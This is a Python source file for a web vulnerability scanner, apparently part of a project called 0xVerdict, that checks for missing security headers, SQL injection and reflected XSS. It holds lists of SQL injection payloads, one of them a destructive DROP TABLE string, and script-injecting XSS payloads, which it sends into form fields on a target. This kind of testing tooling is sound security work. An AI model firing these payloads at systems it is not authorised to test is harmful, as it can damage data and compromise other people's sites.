"""
0xVerdict — Detection Engine (Member 1: Task 1.2 & 1.3)
Three scanners: Security Headers, SQL Injection, Reflected XSS.
Outputs raw evidence only — verdict is determined by the AI engine.
"""

import asyncio
import aiohttp
import time
import uuid
import re
from urllib.parse import urlencode, urljoin


# ─── SQL Injection Payloads ──────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "1' AND SLEEP(3)--",
    "1; SELECT SLEEP(3)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "'; DROP TABLE users--",
    "1 UNION SELECT NULL,NULL,NULL--",
]

# ─── SQL Error Signatures ────────────────────────────────────────────────────
SQLI_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg::syntaxerror",
    r"ora-\d{5}",
    r"microsoft odbc sql server driver",
    r"sqlite3\.operationalerror",
    r"syntax error.*sql",
    r"mysql_fetch_array",
    r"supplied argument is not a valid mysql",
    r"division by zero in",
    r"invalid query",
    r"sql syntax.*near",
]

# ─── XSS Payloads ────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    '"><svg/onload=alert(1)>',
]

REQUEST_TIMEOUT = 12
SLEEP_THRESHOLD = 2.5  # seconds — for time-based SQLi detection


class DetectionEngine:
    def __init__(self, target_url: str, recon_data: dict):
        self.target_url = target_url
        self.recon_data = recon_data
        self.findings: list[dict] = []
        self.connector = aiohttp.TCPConnector(ssl=False)
        self.timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)

    async def run(self) -> list[dict]:
        """Run all three scanners and return deduplicated raw findings list."""
        async with aiohttp.ClientSession(
            connector=self.connector, timeout=self.timeout
        ) as session:
            await asyncio.gather(
                self._scan_security_headers(),
                self._scan_sqli(session),
                self._scan_xss(session),
                return_exceptions=True,
            )
        return self._deduplicate(self.findings)

    def _deduplicate(self, findings: list[dict]) -> list[dict]:
        """Keep only one finding per (type, endpoint) pair — best evidence wins."""
        seen: dict[tuple, dict] = {}
        for f in findings:
            key = (f.get("type", ""), f.get("endpoint", ""))
            if key not in seen:
                seen[key] = f
            else:
                # Keep the one with more evidence (longer raw_evidence)
                if len(f.get("raw_evidence", "")) > len(seen[key].get("raw_evidence", "")):
                    seen[key] = f
        return list(seen.values())

    # ─── Scanner 1: Security Headers ─────────────────────────────────────────
    async def _scan_security_headers(self):
        missing = self.recon_data.get("missing_headers", [])
        headers = self.recon_data.get("headers_collected", {})

        severity_map = {
            "Content-Security-Policy": "High",
            "Strict-Transport-Security": "Medium",
            "X-Frame-Options": "Medium",
            "Referrer-Policy": "Low",
            "X-Content-Type-Options": "Low",
            "Permissions-Policy": "Low",
        }

        for header in missing:
            self.findings.append({
                "id": f"vuln_{uuid.uuid4().hex[:8]}",
                "type": f"Missing Security Header: {header}",
                "endpoint": self.target_url,
                "payload": "N/A (Passive Check)",
                "raw_evidence": (
                    f"HTTP response did not include the '{header}' header. "
                    f"Present headers: {list(headers.keys())[:10]}"
                ),
                "scanner_severity": severity_map.get(header, "Low"),
            })

    # ─── Scanner 2: SQL Injection ─────────────────────────────────────────────
    async def _scan_sqli(self, session: aiohttp.ClientSession):
        forms = self.recon_data.get("forms_found", [])
        tasks = []
        for form in forms:
            for payload in SQLI_PAYLOADS:
                tasks.append(self._test_sqli_form(session, form, payload))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_sqli_form(
        self, session: aiohttp.ClientSession, form: dict, payload: str
    ):
        """Inject a SQL payload into every form input and inspect the response."""
        inputs = {inp["name"]: payload for inp in form.get("inputs", [])}
        if not inputs:
            return

        endpoint = form["endpoint"]
        method = form.get("method", "GET").upper()

        try:
            start = time.time()
            if method == "POST":
                async with session.post(endpoint, data=inputs) as resp:
                    elapsed = time.time() - start
                    body = await resp.text(errors="replace")
            else:
                async with session.get(endpoint, params=inputs) as resp:
                    elapsed = time.time() - start
                    body = await resp.text(errors="replace")

            body_lower = body.lower()
            error_match = None
            for pattern in SQLI_ERROR_PATTERNS:
                match = re.search(pattern, body_lower)
                if match:
                    error_match = match.group()
                    break

            time_based = elapsed >= SLEEP_THRESHOLD and "SLEEP" in payload.upper()

            if error_match or time_based:
                evidence_parts = []
                if error_match:
                    # Extract surrounding context (200 chars)
                    idx = body_lower.find(error_match)
                    snippet = body[max(0, idx - 50) : idx + 150].strip()
                    evidence_parts.append(f"Database error signature detected: '{error_match}'")
                    evidence_parts.append(f"Response snippet: ...{snippet}...")
                if time_based:
                    evidence_parts.append(
                        f"Time-based detection: Response delayed {elapsed:.1f}s "
                        f"(threshold: {SLEEP_THRESHOLD}s). Payload caused server-side sleep."
                    )

                self.findings.append({
                    "id": f"vuln_{uuid.uuid4().hex[:8]}",
                    "type": "SQL Injection",
                    "endpoint": endpoint,
                    "payload": payload,
                    "raw_evidence": " | ".join(evidence_parts),
                    "scanner_severity": "High",
                    "http_method": method,
                    "injected_params": list(inputs.keys()),
                })
        except asyncio.TimeoutError:
            if "SLEEP" in payload.upper():
                self.findings.append({
                    "id": f"vuln_{uuid.uuid4().hex[:8]}",
                    "type": "SQL Injection (Possible Time-Based)",
                    "endpoint": endpoint,
                    "payload": payload,
                    "raw_evidence": (
                        f"Request timed out after {REQUEST_TIMEOUT}s with SLEEP payload. "
                        "This may indicate a successful time-based blind SQLi."
                    ),
                    "scanner_severity": "High",
                    "http_method": method,
                    "injected_params": list(inputs.keys()),
                })
        except Exception:
            pass

    # ─── Scanner 3: Reflected XSS ────────────────────────────────────────────
    async def _scan_xss(self, session: aiohttp.ClientSession):
        forms = self.recon_data.get("forms_found", [])
        tasks = []
        for form in forms:
            for payload in XSS_PAYLOADS:
                tasks.append(self._test_xss_form(session, form, payload))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_xss_form(
        self, session: aiohttp.ClientSession, form: dict, payload: str
    ):
        """Inject XSS payload and check if it reflects verbatim in the response."""
        inputs = {inp["name"]: payload for inp in form.get("inputs", [])}
        if not inputs:
            return

        endpoint = form["endpoint"]
        method = form.get("method", "GET").upper()

        try:
            if method == "POST":
                async with session.post(endpoint, data=inputs) as resp:
                    body = await resp.text(errors="replace")
            else:
                async with session.get(endpoint, params=inputs) as resp:
                    body = await resp.text(errors="replace")

            # Check verbatim reflection (not HTML-encoded)
            if payload in body:
                # Confirm it's not inside an attribute safely encoded
                encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
                if encoded_payload not in body:
                    idx = body.find(payload)
                    snippet = body[max(0, idx - 80) : idx + 120].strip()
                    self.findings.append({
                        "id": f"vuln_{uuid.uuid4().hex[:8]}",
                        "type": "Reflected XSS",
                        "endpoint": endpoint,
                        "payload": payload,
                        "raw_evidence": (
                            f"Payload reflected verbatim in HTTP response without HTML encoding. "
                            f"Context: ...{snippet}..."
                        ),
                        "scanner_severity": "High",
                        "http_method": method,
                        "injected_params": list(inputs.keys()),
                    })
        except Exception:
            pass
